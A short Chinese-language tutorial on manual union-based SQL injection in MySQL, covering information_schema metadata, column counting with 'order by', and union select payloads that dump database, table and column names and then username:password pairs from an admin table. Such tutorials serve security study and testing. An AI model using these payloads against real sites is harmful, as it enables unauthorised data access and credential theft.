准备知识

1.元数据
元数据是指数据库内部包含的数据，如数据库或表的名称、列的数据类型或访问权限
MySQL服务器的元数据位于INFORMATION_SCHEMA虚拟数据库中。
SQL Server可以通过INFORMATION_SCHEMA或系统表（sysobjects、sysindexkeys、sysindexes、syscolumns、systypes）及系统存储过程来访问元数据
2.information_schema 库中常用的表
SCHEMATA表：当前mysql实例中所有数据库的信息
TABLE表：存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。
COLUMNS 表：存储表中的列信息，包括表有多少列、每个列的类型等。

一.找注入参数，判断是字符型还是字符型

二.判断字段个数
?id=1 order by XX
使页面显示正常的最后一个数字为字段个数，可用对半查找来缩小范围
三.判断字段精确位置
当union前面的语句为false时才会执行后面语句，所以union语句前，先构建一个错误条件。
?id=XX and 1=2 union select 1,2,3……
返回的数字可以在相应的位置处替换需要查询的参数，如下：
数据库名 database( )，管理员信息 user( )，用户名 username，密码 password，版本 version( )
还可以直接替换成相应的select语句（需要用括号包围），以下是几个常用的语句
爆所有数据名
select group_concat(SCHEMA_NAME) from information_schema.schemata
得到当前库的所有表
select group_concat(table_name) from information_schema.tables where table_schema=database()
得到表中的字段名 将敏感的表进行16进制编码adminuser=0x61646D696E75736572
select group_concat(column_name) from information_schema.columns where table_name=0x61646D696E75736572
得到字段具体的值
select group_concat(username,0x3a,password) from adminuser
